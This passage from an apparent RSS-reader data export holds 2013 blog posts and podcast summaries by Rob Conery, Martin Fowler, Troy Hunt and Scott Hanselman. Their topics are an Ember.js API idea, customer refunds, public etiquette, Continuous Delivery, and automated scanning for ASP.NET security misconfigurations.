class=\"p\">}</span></span><span class='line'></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">}</span></span></code></pre></td></tr></table></div></figure><p>The view is just a script tag with the id\"index\" in keeping with the spirit of Ember. In the view I can use all the same templating and expect to use whatever method/data that I've declared on my controller.</p><p>The nice thing about this setup is that I'm using the model as a separate idea - it's not magically melded to my controller and it keeps the concepts a bit cleaner (to me).</p><p>Let's put the name first and formalize the overrides in a single place. This is how I think about things, at least, and it would be nice to see it all in one place.</p><h2>A Little Help?</h2><p>OK, You've installed Ember after reading a tutorial. You've seen a post with the API above and you want to get started writing some code.</p><p>Ember has created the App for you, but it doesn't have a View:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">Ember</span><span class=\"nx\">is</span><span class=\"nx\">installed</span><span class=\"nx\">and</span><span class=\"nx\">ready</span><span class=\"nx\">to</span><span class=\"nx\">go</span><span class=\"o\">!</span><span class=\"nx\">The</span><span class=\"nx\">first</span><span class=\"nx\">step</span><span class=\"nx\">is</span><span class=\"nx\">to</span><span class=\"nx\">create</span><span class=\"nx\">a</span><span class=\"nx\">view</span><span class=\"o\">:</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">script</span><span class=\"nx\">type</span><span class=\"o\">=</span><span class=\"s2\">\"text/x-handlebars\"</span><span class=\"nx\">data</span><span class=\"o\">-</span><span class=\"nx\">template</span><span class=\"o\">-</span><span class=\"nx\">name</span><span class=\"o\">=</span><span class=\"s1\">'application'</span><span class=\"o\">&gt;&lt;</span><span class=\"err\">/script&gt;</span></span><span class='line'></span><span class='line'><span class=\"nx\">Put</span><span class=\"nx\">that</span><span class=\"nx\">tag</span><span class=\"nx\">on</span><span class=\"nx\">your</span><span class=\"nx\">page</span><span class=\"nx\">where</span><span class=\"nx\">you</span><span class=\"nx\">want</span><span class=\"nx\">to</span><span class=\"nx\">see</span><span class=\"nx\">your</span><span class=\"nx\">app</span><span class=\"p\">.</span></span></code></pre></td></tr></table></div></figure><p>Nice - you copy paste that into your HTML page, and the next thing you see is...</p><div class='well'><h2>Hello, Welcome To Ember</h2><p>This is your Index space and you can override me by defining an index template:</p><pre><script type=\"text/x-handlebars\" data-template-name=\"index\"></ script></pre></p><p>... and overriding App.Index:</p><pre><code>App.Index = function(){return {//the code you see above}}</code></pre><p>You can read the<a href='#'>Documentation on what this is here</a>.</p></div><p>Not only did Ember create an<code>App</code>for us - it also created a default Index\"space\" if you will. That Index defaulted to a nice helpful message on what to do next.</p><h2>Arm Waving</h2><p>That's what this is. I might be completely crazy, I might utterly misunderstand what Ember is trying to do.</p><p>I'll tell you this, however:<strong>if this is the way Ember crafted their API, I'd love it.</strong>.</p><p>So there it is! I like being constructive when I can - hopefully this helps the team :).</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=rEbegmNcGV8:qHi1k0SsVbs:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=rEbegmNcGV8:qHi1k0SsVbs:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/rEbegmNcGV8\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1124}}
{"k":"0000000084","o":"0000009675","v":"001"}
{"_id":1125,"_uid":1125,"_dt":1373742620937,"_s":"08aa462f4a90f795bca592325e9a539b"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/PZzbWDi8bww/customer-service-vs-serving-the-customer","title":"Customer Service vs. Serving the Customer","published":{"$wrap":"$date","v":1361199600000,"h":"2013-02-18T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>If you've ever sent a support email to Tekpub, you know I'm in the habit of asking questions. I think truly serving the Customer sometimes means asking questions, and sometimes even saying \"No\"...</p><p><img src='http://wekeroad.com/images/service.jpeg'/></p><p><h2>May I Help You?</h2><p>I receive a number of support emails during the normal work week. They are mostly technical ones about our streaming player or questions about our content. Occasionally requests for certain topics.</p><p>And then there are the requests for refunds. This happens rather rarely, but when they do I tend to take extra time with them. This tends to piss people off and typically I have to wade through a lot of back and forth before we get down to the problem.</p><p>The following really happened, and (as you might expect) I'm paraphrasing a bit - not revealing names:</p><blockquote><p><strong>Customer</strong>:\"I don't find your service worth it and would like my money back.\"</p><p><strong>Me</strong>:\"Sorry to hear that! What's the problem\"</p><p><strong>Customer</strong>:\"As I said I don't find value in your videos - can I have a refund or not? Is this going to be one of those things that I have to fill out some questionnaire or stupid survey. DUDE JUST CANCEL MY SUB\"</p></blockquote><p>So at this point I have a problem. Do I continue asking him about the problem or do I just refund him and remember that\"The Customer is Always Right\". What would you do?</p><p>One thing I know is that an unhappy customer, tended to correctly, will rapidly turn into one of your happiest customers. It's a gamble, especially when CAPS are invoked... but I pressed on.</p><blockquote><p><strong>Me</strong>: Listen I understand you're not happy but sometimes it comes down to knowing just a bit more about a problem and I can fix it - and often it makes people very happy. If you had the time to explain just a bit - I would really appreciate it. Your refund is on the way, by the way.</p></blockquote><p>This is one of my standard responses. Typically (not always) I will send the refund immediately. Upset people tend to become less upset, and then answer your questions. In this case, it worked out really well:</p><blockquote><p><strong>Customer</strong>: Sorry I should be a bit more clear. I<strong>love your videos</strong>and they're really good, but I can't afford the service and I thought I could but I just lost my job and I need to pull things back in. I didn't mean to be insulting and I guess I'm a bit stressed out. Thanks for the refund and if I get another job soon I'll come back.</p><p><strong>Me</strong>: No problem at all and thanks for letting me know this - it really does make a difference. XXXXXXXXX - that's a coupon for an Annual Subscription. Educating yourself will help find work and, if you want to pay me back,<a href=\"http://tekpub.com/gifts/new\">buy an annual for someone else</a>.</p></blockquote><p>Needless to say, the Customer was ecstatic and we solved the problem - something I would never have known about unless I pushed a little bit -<strong>pushed the Customer to let me help them</strong>.</p><p>I give stuff away constantly - especially to people who need it.</p><h2>This Backfires</h2><p>Just today - in fact it's the reason I'm writing this post - someone asked me for a refund. It was the first in 4 months and, as I do, I asked some questions first.</p><p>Many businesses adopt a\"No Questions Asked\" policy and I understand why - it's a blind guarantee and gives the appearance of standing squarely behind your product or service.</p><p>I find that this is short-sited but NOT because you shouldn't blindly guarantee your stuff, but<strong>it's more likely there's simply a misunderstanding happening, and you can FIX IT</strong>.</p><p>So anyway the Customer wanted a refund:</p><blockquote><p><strong>Customer</strong>: I want a refund for my monthly subscription because Pluralsight has more content than you.</p><p><strong>Me</strong>: They sure do, but I can't guarantee our stuff against another company's. I do know you'll be happy with what we offer because it's quite good and I notice you've only watched half of a single episode of all of our stuff. Might I recommend you give it some more time?</p><p><strong>Customer</strong>: I didn't ask you to guarantee Pluralsight - but you should do something to compare your stuff vs. theirs so people know the difference. Your refund policy states\"...'snip' ...\" Thus I'd like a refund.</p></blockquote><p>Here I have a problem. They haven't watched any of our stuff and are, essentially, having\"Buyer's Remorse\" as they saw more stuff at Pluralsight.<a href=\"http://pluralsight.com/training/Courses\">And Pluralsight has a whole lot of stuff</a>. Buyer's remorse and Pluralsight's catalog are not covered under our refund policy (as you can imagine) so...</p><p>If I keep pushing this angle, I'll lose. Pluralsight has an amazing library but there are differences in our content - I need to get that across as well as the main point:<strong>Why not have both!</strong>. It's $15 + $29 == $45/month. Think of what that means in terms of educating yourself and readying your career! Yet people scrutinize this expense as if it were some kind of luxury!</p><p>OK, so back to the matter at hand. How would you respond here? This is what I said:</p><blockquote><p><strong>Me:</strong>Our return policy covers what<strong>we create</strong>and if you don't like it, then yes we'll stand behind that. But you haven't tried it out yet and, forgive me if I'm misunderstanding here, you're asking for a refund because Pluralsight has more stuff.</p><p>I don't want unhappy customers and I'm sending your refund now - but when you get to Pluralsight you might not want to look at Lynda.com.</p><p>If you use Peepcode don't try CodeSchool or Treehouse. What you see as an advantage (more videos) is hardly a measure of the content (and its relevance to you). Either way, your refund is on its way\"</p></blockquote><p>I should have left that last part out. That was my ego, feeling bruised and frustration setting in because I felt that what they were asking for was not entirely fair.</p><p>And, as expected, the customer didn't like my response.<strong>Things started getting personal and I was told my Customer Service sucks</strong>(which wouldn't be the first time). The Customer ended things by saying\"I was planning on coming back to Tekpub if I didn't like Pluralsight but... not with this Customer Service experience\".</p><p>Which means I lose. Actually, we both lost because<a href=\"http://support.pluralsight.com/knowledgebase/articles/32815-what-is-your-refund-policy-\">I don't think he'll have the same option at Pluralsight</a>.</p><h2>Turning It Around. Or Turning It Off?</h2><p>I lost that battle because I tried to reason with someone who was unhappy - and that is almost always a bad idea. There are ways of asking questions that don't lead the Customer to believe they're being screwed or messed with - and I was trapped with this one.</p><p>They gave me money, and they regretted it even though they didn't even try what they paid for. To me,<strong>I was utterly convinced that if they tried our stuff, they'd love it</strong>and I kept trying to communicate that... but in the wrong way. I think I understand why many companies simply refuse to do refunds - it forces customers to consider a bit more carefully.</p><p>This is not to say that you shouldn't show Customers the door. I've had people (literally) try to extort me by\"taking it to Hacker News\" unless I refunded them for videos that my logs showed they were clearly sharing (multiple downloads to same IP over the period of a month). I asked them if it's OK to loop in their legal department, then I deleted their account and banned them.</p><p><strong>There are some customers you need to cut loose - basically a No Soup For You</strong>policy. They exist, it sucks, and it spoils it for customers who aren't Out To Get Your (to-date that's happened 5 times and I'm not happy about it... but it needed to happen).</p><p>On the bright side,<strong>I've managed to turn unhappy customers into Big Fans about 85% of the time: simply by asking questions and trying to care</strong>instead of following some old-school, outdated tome.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PZzbWDi8bww\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1125}}
{"k":"0000000084","o":"0000000947","v":"001"}
{"_id":1126,"_uid":1126,"_dt":1373742620937,"_s":"89c2ad5057ade0b2274080e36a4c77df"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://gotocon.com/amsterdam-2013/","title":"Speaking in Amsterdam","published":{"$wrap":"$date","v":1370356200000,"h":"2013-06-04T14:30:00.000Z"},"starred":false,"read":false,"content":"<div class = 'img'><img src = 'http://martinfowler.com/snips/goto-ams.png' width = '75' height = '' alt = '' title = ''/></div><p>Although I do my best to limit my public speaking, I do have a fond spot for the<a href='http://gotocon.com/'>goto</a>series of conferences. Later this month they are running<a href='http://gotocon.com/amsterdam-2013/'>a full conference in Amsterdam</a>, and I’ll be doing a keynote for them on Wednesday June 19. I’ll be doing my usual<a href='http://martinfowler.com/bliki/SuiteOfTalks.html'>suite of talks</a>format, but haven’t yet decided which talks will go in the set. I hope to see some of my regular readers there.</p>","author":false,"_id":{"$wrap":"$oid","v":1126}}
{"k":"0000000084","o":"0000009038","v":"001"}
{"_id":1127,"_uid":1127,"_dt":1373742620937,"_s":"3d456a85290c1edf58d4f3e232e35d22"}
{"subscription":{"$wrap":"$oid","v":37},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/ZagFlqH-NhI/hell-is-other-people","title":"Hell... Is Other People","published":{"$wrap":"$date","v":1363964400000,"h":"2013-03-22T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>Get up from your desk or chair or floor and go for a walk. Right now - I challenge you to do this. If you can walk through a crowded place - that's even better. Go by yourself, and soak it in... all of it...</p><p><img src='http://wekeroad.com/images/hell_other_people.jpg'/></p><p><p><em>image from<a href=\"http://venndiagrams.tumblr.com/post/1269983588/robotrobotrobot-hell-is-other-people-venn\">venndiagrams.tumblr.com</a></em></p><h2>Garrett Is A JERK</h2><p>It's 7:40am and I'm sitting outside my office with a warm, steamy cup of my favorite roast from Hanalei Roasting company. It's the perfect shade of rich, deep oakey-brown that tells me I hit the right mixture of milk and sugar.</p><p>I'm looking over the hills from the upstairs walkway in front of my office door. Behind me, the door is open and work is waiting for me... in front of me the sun is poking through the golden morning clouds and the dew from the damp air is everywhere.</p><p>It's quiet, and I'm loving it.<strong>Until Garrett entered my life</strong>.</p><p>Well, it was Garrett's girlfriend, actually. It started with a low, shrill sound that came from around the parking lot. It was muffled somewhat but it sounded like someone in trouble. Naturally I looked around, thinking someone might need my help.</p><p>Then all of a sudden the volume increased dramatically as she got out of her car. She was in full hysterics, yelling into the phone about how Garrett was a FUCKING PIECE OF SHIT JERK ASSHOLE etc. etc.</p><p>She stood there for about 30 seconds in the parking lot that was filling with cars as people came to work. They walked past her, careful not to look.</p><p>After a while she slammed the door of her car and stormed upstairs. She works in the office next to mine. I decided to give her some space so I went inside and shut the door. She decided to stay outside and vent her rage over the entire parking lot, into the golden sunrise morning I was just enjoying.</p><p>She stayed there for 20 minutes, then went inside. I got to learn all about Garrett... who apparently is not a very nice person.</p><h2>Yeah Yeah Yeah</h2><p>4 weeks ago I took my family to Kalihiwai Beach where we like to go for barbeques with friends. It was a lovely night, the sun setting much the same way it comes up: golden light poking through swollen, puffed clouds full of warm rain.</p><p>6 of us were sitting around the tailgate of my truck, when right next to us pulls up a black Hummer with blinking blue lights underneath. It's a high-end\"situational\" rental car that is completely out of place here, on this beach in Hawaii. It's an LA ride that looks like the UFO it was apparently dropped from.</p><p>Out of the car comes a 30-something markety/dotcom guy. Thick glasses, tall and in shape. He's from LA - as am I - and we can smell it on each other. He tips his head back:\"SUP\".</p><p>We wave as he reaches back in his car and flips on, full volume,<a href=\"https://www.youtube.com/watch?v=umAL-6-j1Ew\">one of the worst remixes of one of the best Yeah Yeah Yeahs songs there is</a>. He opens the door wide - the one that faces us. He then goes to the back door and does the same... and then turns it up with a remote control in his pocket. All... the way... UP.</p><p>My chest thumps as the bass booms from inside. Purple beat-lights glow with the pulse of this horrible song as the trees ring with the echo of cheesy synth loops.</p><p>He's 20 feet away from us. There are no other cars on this half-mile stretch of beach. He's got this song on a loop so it plays... continually.</p><p>As opposed to Garrett's girlfriend, we didn't stand for it long. My buddy's wife casually went over and asked them to shut the doors facing us and to ... maybe open the doors facing them (no, really). They did, but not without giving stink eye.</p><h2>Bookended</h2><p>At lunch 3 months ago I sat at a table with a friend from out of town and a couple proceeded to get into a fight next to us. The lady stood up to storm away but thought of something clever so turned around just on the other side of us and, snappily, and let him have it. A lovely insult about his new car, flying right over the top of our heads and into his anger-laden face.</p><p>He fought back, she stayed put. We're square in the middle. I sat back and just listened - turning my head as if at an emotional tennis match between the two. The guy looked at me as if to say\"bug off\", I shrugged with my hands in the air (\"where should I go?\")... and they went outside... glaring back at me on the way.</p><h2>CONTEXT</h2><p>So many people are absolutely, stunningly unaware about the little bubble that surrounds them, defined by their thoughts, emotions and words. An interesting (and at the same time scary) thing is that groups of us share these things together - and our bubbles grow as we join into a group.</p><p>We walk around like pachinko balls ... bouncing our bubbles off someone else's. They either repel, or like bubbles, can join and grow larger. You can manage this process.</p><p>In a room full of other people, you have to manage that bubble of yours quite methodically - especially when you're with a group of friends having what you think is a private conversation.<strong>It almost never is</strong>.</p><p>That person sitting next to you on the bus/train/plane speaking really loudly into their cellphone? The new parents involving the entire restaurant in the little game they're playing with little Dylan? Or maybe the person in the front of the line who just now thought about looking at the menu and deciding what to eat...</p><p>Awareness. A Good Thing.</p><p>Whatever you're saying, thinking, emoting - all of it is shared with the people around you to some degree - even if they can't directly hear you. We're a sensitive animal and have senses built into us forged by millions of years of survival, intellect, and cunning. To pretend that words alone define meaning is complete folly.</p><p>Joking with your friend in a room full of diverse people isn't necessarily harmful, until you become blind to your own context as each of the people in the above stories were. Sometimes it doesn't matter. Other times it does.</p><p>You might be sitting next to someone who's sitting on an emotional grenade. That clever little joke you just made? It could be about guns, politics, gay marriage... or dongles. Well it might set that grenade off.</p><p>Call it professionalism, politeness, or just Old Fashioned Decency - it's why these things exist:<strong>so we can get along and avoid atomic swarm tendencies</strong>.</p><p>Until another person welcomes you into their context - no - you're not free (socially speaking) to do as you please without consequence. As much as you might feel you're protected by law to walk naked down the street singing that horrid Yeah Yeah Yeahs remix - your actions have an effect (and consequence) with others.</p><p>The same goes for being upset. Be aware of yourself and just how angry you've become. Think about why, and remember you're in public, around strangers. Think about your actions carefully in the way that the people in the story above did not.</p><p>This doesn't simply sit along gender lines (saying<a href=\"http://blog.8thlight.com/uncle-bob/2013/03/22/There-are-ladies-present.html\">There are Ladies Present</a>is a bit off the mark to me - the issue could as well have been racial or religious). I prefer to think<strong>there are other people present</strong>.</p><p>The only way to truly avoid the hell that can be other people is to understand the power of your own presence. Believe that you<strong>do</strong>have an effect on others.<strong>Just make it a positive one</strong>always.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=ZagFlqH-NhI:tRZQf2khJVI:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/ZagFlqH-NhI\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1127}}
{"k":"0000000084","o":"0000006041","v":"001"}
{"_id":1128,"_uid":1128,"_dt":1373742620937,"_s":"d5a85e05ecb1e58af446439d1e287617"}
{"subscription":{"$wrap":"$oid","v":44},"link":"http://feedproxy.google.com/~r/TroyHunt/~3/0sjQHMWcphI/dynamic-security-misconfiguration.html","title":"Dynamic security misconfiguration scanning with OnCheckin and ASafaWeb","published":{"$wrap":"$date","v":1371679260001,"h":"2013-06-19T22:01:00.001Z"},"starred":false,"read":false,"content":"<p>Here’s the thing about security – you can’t just “do it” then move on. What I mean by this is that it’s a continuous process and thinking that you only need to just implement some secure coding standards or scan the website once before go live leaves a great big hole in your process.</p><p>For example, the other day I wrote about how<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">insecurity is easy</a>where I talked about how Black and Decker had exposed ELMAH logs. This is the tiniest of security misconfigurations which can easily happen at any time but it meant that they ended up with the credentials from a significant portion of their customer base publicly accessible – ouch! Ok, this also involved storing plain text passwords in cookies in order to facilitate the “remember me” function (no, really), but the point is in how easy it was to make a simple change that blew a massive hole in the side of their security profile.</p><p>This brings me to the point of the post: security misconfiguration happens and you need to start looking for it bang after you publish the site. Exposed ELMAH logs is one thing but simple security misconfiguration changes you can screw up on release of an ASP.NET website go well beyond that; custom errors, tracing, request validation and the way your cookies are configured to name but a few. Each of these can be configured to leave a site vulnerable in literally just a few seconds.</p><p>For the last couple of years I’ve provided a service to detect these problems in a live site –<a href=\"https://asafaweb.com\">ASafaWeb</a>. The value proposition of ASafaWeb has always been that on demand, you can scan your live ASP.NET website and it will report on these security misconfigurations. Now I’m very happy to share how ASafaWeb has been integrated into<a href=\"https://oncheckin.com/\">OnCheckin</a>(the brainchild of<a href=\"http://www.diaryofaninja.com/\">Doug Rathbone</a>) to provide continuous deployment for ASP.NET websites as a cloud-based service.</p><p><img width=\"492\" height=\"101\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"OnCheckin - Cloud Powered Deployment\" src=\"http://lh4.ggpht.com/-QewvOaRCVAE/UcIqJJcxP2I/AAAAAAAAFa0/Lq_jFP5xOfA/OriginalLogo2.png?imgmax=800\" border=\"0\"></p><a name='more'></a><p>Here’s how it works: Firstly, you plug it into source control:</p><p><img width=\"791\" height=\"636\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring source control\" src=\"http://lh3.ggpht.com/-9gS7OyP31vg/UcIqJ9H9scI/AAAAAAAAFa8/yVX3JMb2QA0/image2.png?imgmax=800\" border=\"0\"></p><p>Then you configure the deployment:</p><p><img width=\"785\" height=\"968\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring deployment\" src=\"http://lh6.ggpht.com/-dLELbPIfWuk/UcIqKXe-9EI/AAAAAAAAFbE/pfNLEqbO4OA/image5.png?imgmax=800\" border=\"0\"></p><p>Then finally you review everything and tick the box to run the ASafaWeb scan after every deployment:</p><p><img width=\"788\" height=\"888\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Configuring ASafaWeb\" src=\"http://lh5.ggpht.com/-Uyoj7L3jeDU/UcIqLFxOwbI/AAAAAAAAFbM/wUxPb48a3ao/image31.png?imgmax=800\" border=\"0\"></p><p>That’s it – job done! Now each time the scan runs there’ll be a little ASafaWeb tab and a nice report on how the scan went:</p><p><img width=\"880\" height=\"522\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The ASafaWeb report in OnCheckin\" src=\"http://lh3.ggpht.com/-xlPwH-zRX9Q/UcIqLwBN_AI/AAAAAAAAFbU/EtXZ9ZXtZWk/image11.png?imgmax=800\" border=\"0\"></p><p>What I really like about this is the continuous nature of the process. Every time that build runs, the site is going to get scanned and so long as you’re keeping an eye on the results you shouldn’t have sneaky security misconfigurations making their way through to production. Well at least not for very long!</p><p>The other thing about this integration is that it’s another step towards publicly releasing the ASafaWeb API. Yes, there’s an API and in fact it’s been used extensively as the magic behind the<a href=\"http://www.troyhunt.com/2012/08/welcome-to-asafaweb-scheduler.html\">ASafaWeb Scheduler</a>which gives you the ability to scan your sites on a regular basis (I mentioned it’s free, right?!). The intention has always been to open the API up for anyone to consume I reckon including it into the continuous integration cycle is a fantastic use-case.</p><p>To that effect, if you’re involved in a similar project and would like to integrate ASafaWeb then I’d love to hear from you. I’m happy to open it up to beta testers who want to contribute feedback and I know there are a<em>ton</em>of good ideas out there for how it might be used.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/0sjQHMWcphI\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1128}}
{"k":"0000000084","o":"0000000726","v":"001"}
{"_id":1129,"_uid":1129,"_dt":1373742620938,"_s":"46fc61a3badd81fd142ac1f04639860d"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/wejSW_lUpxA/default.aspx","title":"Practical ReST with Sebastien Lambla","published":{"$wrap":"$date","v":1365739200000,"h":"2013-04-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott talks to Sebastien Lambla, author of OpenWrap and OpenRasta, to get his thoughts about ReST. Why are people so passionate about their Web Services? Should creators of Web Services be required to understand the Web, or is it OK to abstract things away?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/wejSW_lUpxA\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1129}}
{"k":"0000000084","o":"0000000785","v":"001"}
{"_id":1130,"_uid":1130,"_dt":1373742620938,"_s":"fe3addb6ee37de34d4f03da62e8aadb3"}
{"subscription":{"$wrap":"$oid","v":5},"link":"http://feedproxy.google.com/~r/HanselminutesCompleteMP3/~3/mVJ73qMjFVg/default.aspx","title":"Are you secure? WiFi Honeypots, Pineapples and SSL with Troy Hunt","published":{"$wrap":"$date","v":1369368000000,"h":"2013-05-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Scott talks to Security Researcher and Web Developer Troy Hunt about the state of web security. Should I worry when I connect to a wireless network at a coffee shop? How much should I worry and what can I do to protect myself? As a web developer what are the things we most often forget?<img src=\"http://feeds.feedburner.com/~r/HanselminutesCompleteMP3/~4/mVJ73qMjFVg\" height=\"1\" width=\"1\"/>","author":"Scott Hanselman","_id":{"$wrap":"$oid","v":1130}}
{"k":"0000000084","o":"0000003596","v":"001"}
{"_id":1131,"_uid":1131,"_dt":1373742620938,"_s":"b6cf97a44e88d89143c7265cdbe48654"}
{"subscription":{"$wrap":"$oid","v":33},"link":"http://martinfowler.com/bliki/ContinuousDelivery.html","title":"Bliki: ContinuousDelivery","published":{"$wrap":"$date","v":1369922580000,"h":"2013-05-30T14:03:00.000Z"},"starred":false,"read":false,"content":"<p>Continuous Delivery is a software development discipline whereyou build software in such a way that the software can be releasedto production at any time.</p><p>You’re doing continuous delivery when:<a href=\"#footnote-when\">[1]</a></p><ul><li>Your software is deployable throughout its lifecycle</li><li>Your team prioritizes keeping the software deployable over working on new features</li><li>Anybody can get fast, automated feedback on the production readiness of their systems any time somebody makes a change to them</li><li>You can perform push-button deployments of any version of the software to any environment on demand</li></ul><p>You achieve continuous delivery bycontinuously integrating the software done by the development team,building executables, and running automated tests on thoseexecutables to detect problems. Furthermore you push the executablesinto increasingly production-like environments to ensure thesoftware will work in production. To do this you use a<a href=\"http://martinfowler.com/bliki/DeploymentPipeline.html\">DeploymentPipeline</a>.</p><p>The key test is that a business sponsor could request that<b>thecurrent development version of the software can be deployed intoproduction at a moment's notice</b>- and nobody would bat an eyelid,let alone panic.</p><p>To achieve continuous delivery you need:</p><ul><li>a close, collaborative workingrelationship between everyone involved in delivery (often referredto as a \"DevOps culture\"<a href=\"#footnote-devops\">[2]</a>).</li><li>extensive automation of all possible parts of the deliveryprocess, usually using a<a href=\"http://martinfowler.com/bliki/DeploymentPipeline.html\">DeploymentPipeline</a></li></ul><p>Continuous Delivery is sometimes confused with ContinuousDeployment.<b>Continuous Deployment</b>means that every change goesthrough the pipeline and automatically gets put into production,resulting in many production deployments every day. ContinuousDelivery just means that you are able to do frequent deployments butmay choose not to do it, usually due to businesses preferring aslower rate of deployment. In order to do Continuous Deployment youmust be doing Continuous Delivery.</p><p><a href=\"/articles/continuousIntegration.html\">ContinuousIntegration</a>usually refers to integrating, building, and testingcode within the development environment. Continuous Delivery buildson this, dealing with the final stages required for productiondeployment.</p><p>For more information see the resources on my<a href=\"/delivery.html\">guide page</a>, in particular<a href=\"/books/continuousDelivery.html\">the book</a>.</p><div class=\"acknowledgements\"><h2>Acknowledgements</h2><a href=\"http://continuousdelivery.com/\">Jez Humble</a>provideddetailed help with this page.</div><div class=\"footnote-list\"><h2>Notes</h2><div class=\"footnote-list-item\" id=\"footnote-when\"><p><span class=\"num\">1:</span>These indicators were developed by the Continuous Deliveryworking group at ThoughtWorks</p></div><div class=\"footnote-list-item\" id=\"footnote-devops\"><p><span class=\"num\">2:</span>Despite the name \"devops\" this should extend beyond developersand operations to include testers, database teams, and anyoneelse 